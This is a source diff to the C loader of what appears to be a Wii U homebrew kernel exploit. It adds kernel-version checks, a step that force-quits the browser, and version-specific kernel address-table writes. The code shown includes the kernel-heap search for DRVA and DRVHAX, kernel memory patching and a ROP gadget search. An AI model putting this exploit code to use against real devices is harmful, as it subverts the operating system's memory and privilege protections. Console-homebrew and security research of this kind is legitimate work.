@@ -1,21 +1,28 @@
 #include "loader.h"
 
-/* Start of our code */
+/* Initial setup code stolen from Pong, makes race much more reliable */
 void _start()
 {
-	/* Load a good stack */
+	// Notify the user if the kernel version is not implemented
+	if(KERN_SYSCALL_TBL == 0)
+	{
+		OSFatal("Your kernel version has not been implemented yet");
+	}
+
+	//Load a good stack
 	asm(
 		"lis %r1, 0x1ab5 ;"
 		"ori %r1, %r1, 0xd138 ;"
 	);
- 
-	/* Get a handle to coreinit.rpl */
+
 	unsigned int coreinit_handle;
 	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);
-
-	/* OS memory functions */
-	void* (*memcpy)(void *dest, void *src, uint32_t length);
-	void* (*OSAllocFromSystem)(uint32_t size, int align);
+	
+	//OS Memory functions
+	void*(*memset)(void *dest, uint32_t value, uint32_t bytes);
+	void*(*memcpy)(void *dest, void *src, uint32_t length);
+	void*(*OSAllocFromSystem)(uint32_t size, int align);
+	void (*OSFreeToSystem)(void *ptr);
 	void (*DCFlushRange)(void *buffer, uint32_t length);
 	void (*DCInvalidateRange)(void *buffer, uint32_t length);
 	void (*ICInvalidateRange)(void *buffer, uint32_t length);
@@ -25,23 +32,48 @@ void _start()
 	bool (*OSCreateThread)(void *thread, void *entry, int argc, void *args, uint32_t stack, uint32_t stack_size, int32_t priority, uint16_t attr);
 	int32_t (*OSResumeThread)(void *thread);
 	void (*OSYieldThread)();
+	
+	//IM functions
+	int(*IM_SetDeviceState)(int fd, void *mem, int state, int a, int b);
+	int(*IM_Close)(int fd);
+	int(*IM_Open)();
 
 	/* Exit functions */
 	void (*__PPCExit)();
 	void (*_Exit)();
-
+	
 	/* Read the addresses of the functions */
+	OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
 	OSDynLoad_FindExport(coreinit_handle, 0, "memcpy", &memcpy);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSFreeToSystem", &OSFreeToSystem);
 	OSDynLoad_FindExport(coreinit_handle, 0, "DCFlushRange", &DCFlushRange);
 	OSDynLoad_FindExport(coreinit_handle, 0, "DCInvalidateRange", &DCInvalidateRange);
 	OSDynLoad_FindExport(coreinit_handle, 0, "ICInvalidateRange", &ICInvalidateRange);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSEffectiveToPhysical", &OSEffectiveToPhysical);
+	
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSCreateThread", &OSCreateThread);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSResumeThread", &OSResumeThread);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSYieldThread", &OSYieldThread);
+	
+	OSDynLoad_FindExport(coreinit_handle, 0, "IM_SetDeviceState", &IM_SetDeviceState);
+	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Close", &IM_Close);
+	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Open", &IM_Open);
+	
 	OSDynLoad_FindExport(coreinit_handle, 0, "__PPCExit", &__PPCExit);
 	OSDynLoad_FindExport(coreinit_handle, 0, "_Exit", &_Exit);
+	
+	//Restart system to get lib access
+	int fd = IM_Open();
+	void *mem = OSAllocFromSystem(0x100, 64);
+	memset(mem, 0, 0x100);
+	//set restart flag to force quit browser
+	IM_SetDeviceState(fd, mem, 3, 0, 0); 
+	IM_Close(fd);
+	OSFreeToSystem(mem);
+	//wait a bit for browser end
+	unsigned int t1 = 0x1FFFFFFF;
+	while(t1--) ;
 
 	/* Skip the whole exploit if 0xa0000000 is already mapped */
 	if (OSEffectiveToPhysical((void*)0xa0000000) != 0)
@@ -226,12 +258,12 @@ void _start()
 
 	/* Search the kernel heap for DRVA and DRVHAX */
 	uint32_t drva_addr = 0, drvhax_addr = 0;
-	uint32_t metadata_addr = KERN_HEAP + 0x14 + (kern_read(KERN_HEAP + 0x0c) * 0x10);
+	uint32_t metadata_addr = KERN_HEAP + 0x14 + (kern_read((void*)(KERN_HEAP + 0x0c)) * 0x10);
 	while (metadata_addr >= KERN_HEAP + 0x14)
 	{
 		/* Read the data address from the metadata, then read the data */
-		uint32_t data_addr = kern_read(metadata_addr);
-		uint32_t data = kern_read(data_addr);
+		uint32_t data_addr = kern_read((void*)metadata_addr);
+		uint32_t data = kern_read((void*)data_addr);
 
 		/* Check for DRVA or DRVHAX, and if both are found, break */
 		if (data == 0x44525641) drva_addr = data_addr;
@@ -244,11 +276,15 @@ void _start()
 	if (!(drva_addr && drvhax_addr)) OSFatal("Failed to find DRVA or DRVHAX");
 
 	/* Make DRVHAX point to DRVA to ensure a clean exit */
-	kern_write(drvhax_addr + 0x48, drva_addr);
+	kern_write((void*)(drvhax_addr + 0x48), drva_addr);
 
 	/* Map the loader and coreinit as RW before exiting */
-	kern_write(KERN_ADDRESS_TBL + (0x12 * 4), 0x31000000);
-	kern_write(KERN_ADDRESS_TBL + (0x13 * 4), 0x28305800);
+#if (VER<410)
+	kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x30000000);
+#else
+	kern_write((void*)(KERN_ADDRESS_TBL + (0x12 * 4)), 0x31000000);
+#endif
+	kern_write((void*)(KERN_ADDRESS_TBL + (0x13 * 4)), 0x28305800);
 	_Exit();
 
 after_exploit: ;
@@ -284,13 +320,13 @@ void *find_gadget(uint32_t code[], uint32_t length, uint32_t gadgets_start)
 	uint32_t *ptr;
 
 	/* Search code before JIT area first */
-	for (ptr = (uint32_t*) gadgets_start; ptr != JIT_ADDRESS; ptr++)
+	for (ptr = (uint32_t*) gadgets_start; ptr != (uint32_t*) JIT_ADDRESS; ptr++)
 	{
 		if (!memcmp(ptr, &code[0], length)) return ptr;
 	}
 
 	/* Restart search after JIT */
-	for (ptr = (uint32_t*) CODE_ADDRESS_START; ptr != CODE_ADDRESS_END; ptr++)
+	for (ptr = (uint32_t*) CODE_ADDRESS_START; ptr != (uint32_t*) CODE_ADDRESS_END; ptr++)
 	{
 		if (!memcmp(ptr, &code[0], length)) return ptr;
 	}
